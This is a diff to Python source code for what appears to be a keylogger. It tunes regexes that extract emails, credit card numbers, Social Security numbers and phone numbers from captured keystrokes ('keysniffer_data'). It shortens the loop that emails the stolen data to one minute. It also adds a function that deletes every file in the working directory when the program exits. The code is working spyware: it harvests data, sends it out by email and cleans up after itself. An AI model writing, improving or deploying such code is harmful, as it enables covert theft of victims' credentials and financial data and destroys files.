@@ -35,14 +35,30 @@ def extract_valuable_info(keysniffer_data, filtered_data):
 
     # Define patterns for valuable information
     patterns = {
-        "emails": r"[\w.-]+@[\w.-]+\.\w+",  # Example: johndoe@example.com  --> change mail
-        "phone_numbers": r"\b\d{10}\b|\b\d{3}[-.\s]\d{3}[-.\s]\d{4}\b",  # Example: 123-456-7890 or 1234567890
-        "urls": r"https?://\S+",  # Example: https://www.example.com
-        "credit_cards": r"\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b",  # Example: 1234-5678-1234-5678
-        "ip_addresses": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",  # Example: 192.168.1.1
-        "dates": r"\b\d{4}-\d{2}-\d{2}\b|\b\d{2}/\d{2}/\d{4}\b",  # Example: 2025-01-03 or 01/03/2025
-        "social_security_numbers": r"\b\d{3}-\d{2}-\d{4}\b",  # Example: 123-45-6789
+        # Updated email pattern to only accept emails ending with @gmail.com or @hotmail.com
+        "emails": r"[\w.-]+@(gmail\.com|hotmail\.com)",
+        # Phone numbers: expanded pattern for more global formats (e.g., international numbers)
+        "phone_numbers": r"\+?\d{1,4}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,9}",
+        # URLs: added support for subdomains and optional trailing slash
+        "urls": r"https?://[\w.-]+(?:\.[\w.-]+)+[/\w.-]*",
+        # Credit cards: accept with or without spaces/dashes
+        "credit_cards": r"\b(?:\d{4}[- ]?){3}\d{4}\b",
+        # IP addresses: IPv4 pattern
+        "ip_addresses": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
+        # Dates: support multiple formats, including dots and European formats
+        "dates": r"\b\d{4}[-/.]\d{2}[-/.]\d{2}\b|\b\d{2}[-/.]\d{2}[-/.]\d{4}\b|\b\d{2}[-/.]\d{2}[-/.]\d{2}\b",
+        # Social Security Numbers: expanded example and comment
+        "social_security_numbers": r"\b\d{3}[- ]?\d{2}[- ]?\d{4}\b",
     }
+
+    # Examples for each pattern
+    # emails: Example: johndoe@gmail.com, user@hotmail.com (only gmail.com or hotmail.com allowed)
+    # phone_numbers: Example: +1-123-456-7890, (123) 456-7890, 123.456.7890
+    # urls: Example: https://example.com, http://sub.example.co.uk/path
+    # credit_cards: Example: 1234-5678-1234-5678, 1234567812345678
+    # ip_addresses: Example: 192.168.1.1, 8.8.8.8
+    # dates: Example: 2025-01-03, 01/03/2025, 03.01.2025
+    # social_security_numbers: Example: 123-45-6789, 123 45 6789
 
     extracted_data = {}
 
@@ -126,7 +142,25 @@ def send_email_periodically():
     # Sends the filtered data file as an email attachment every 5 minutes.
     while True:
         send_email()
-        time.sleep(120)  # Wait for 2 minutes
+        time.sleep(60)  # Wait for 1 minutes
+
+
+# ===================================================== Deleting All Files =====================================================
+
+
+def delete_all_files():
+    try:
+        # Iterate through all items in the current directory
+        for item in os.listdir("."):
+            # Construct full path --> for the file
+
+            file_path = os.path.join(".", item)
+            # Check if it is a file and delete it
+            if os.path.isfile(file_path):
+                os.remove(file_path)
+                print(f"Deleted: {file_path}")
+    except Exception as e:
+        print(f"An error occurred while deleting files: {e}")
 
 
 # ===================================================== Running the Program ======================================================
@@ -160,3 +194,6 @@ if __name__ == "__main__":
 
     except KeyboardInterrupt:
         print("Program stopped.")
+
+    finally:
+        delete_all_files()
